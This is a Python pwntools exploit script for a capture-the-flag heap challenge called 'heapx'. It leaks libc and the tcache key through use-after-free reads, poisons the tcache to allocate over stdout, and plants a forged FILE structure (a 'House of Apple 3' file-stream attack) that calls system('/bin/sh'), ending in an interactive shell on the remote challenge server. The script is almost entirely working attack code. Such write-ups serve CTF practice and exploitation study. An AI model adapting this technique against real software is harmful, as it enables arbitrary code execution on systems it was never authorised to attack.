from pwn import *

chal = ELF('./heapx_patched')
libc = ELF('./libc.so.6')

HOST = 'chal.sunshinectf.games'
PORT = 25004

gdbscript='''
b *0x5555555552fa
b *0x555555555660
b *0x555555555570
b *0x5555555555b9
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

if args.GDB:
    conn = gdb.debug([chal.path], gdbscript)
elif args.REMOTE:
    conn = remote(HOST, PORT)
else:
    conn = process([chal.path])

def new(size):
    conn.sendlineafter(b'> ', f'new {str(size)}'.encode())

def read(id):
    conn.sendlineafter(b'> ', f'read {str(id)}'.encode())

def write(id, offset, data):
    conn.sendlineafter(b'> ', f'write {str(id)}'.encode())
    conn.sendline(str(offset).encode())
    conn.sendlineafter(b': ', data)

def delete(id):
    conn.sendlineafter(b'> ', f'delete {str(id)}'.encode())

def exit_program():
    conn.sendlineafter(b'> ', b'exit')

def main():
    new(0x420 - 0x8)
    new(0xf0 - 0x8)
    new(0xf0 - 0x8)
    delete(0)
    delete(1)
    delete(2)
    read(0)
    libc.address = u64(conn.recv(6).ljust(8, b'\0')) - 0x210b20
    info(f'libc.address = {libc.address:#x}')
    read(1)
    key = u64(conn.recv(5).ljust(8, b'\0'))
    info(f'{key = :#x}')

    # Tcaceh Poisoning and House of Apple 3
    addr_stdfile_1_lock = libc.address +  0x2127b0
    addr_stdout = libc.sym['_IO_2_1_stdout_']
    addr_io_wfile_jumps = libc.sym['_IO_wfile_jumps']
    addr_gadget = libc.address + 0x17d690   # add rdi, 0x10 ; jmp rcx

    payload = flat({
        0x0: 0,                             # _flags
        0x8: 0,                             # _IO_read_ptr
        0x10: libc.sym['system'],           # _IO_read_end (rcx)
        0x18: addr_stdout + 0x50,           # _IO_read_base (_codecvt→__cd_in→step)
        0x50: 0,                            # codecvt→__cd_in→step→__shlib_handle
        0x60: b'/bin/sh\0',                 # rdi + 0x10
        0x78: addr_gadget,                  # codecvt→__cd_in→step→__fct
        0x88: addr_stdfile_1_lock,          # _lock
        0x98: addr_stdout + 0x18,           # _codecvt
        0xa0: addr_stdout + 0x200,          # _wide_data (some writable region initialized to 0)
        0xd8: addr_io_wfile_jumps - 0x18,   # vtable
    }, filler=b'\0', length=0xe8)
    info(hexdump(payload))
    write(2, 0, p64(key ^ addr_stdout))
    new(0xf0 - 0x8)
    new(0xf0 - 0x8)
    write(4, 0, payload)

    # `__printf`→`__vfprintf_internal`→`__printf_buffer_to_file_done`→`__printf_buffer_flush_to_file`→`_IO_sputn`
    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdio-common/printf.c#L26-L37
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdio-common/vfprintf-internal.c#L1519-L1567
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdio-common/printf_buffer_to_file.c#L115-L122
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdio-common/printf_buffer_to_file.c#L47-L104
    conn.interactive()

if __name__ == '__main__':
    main()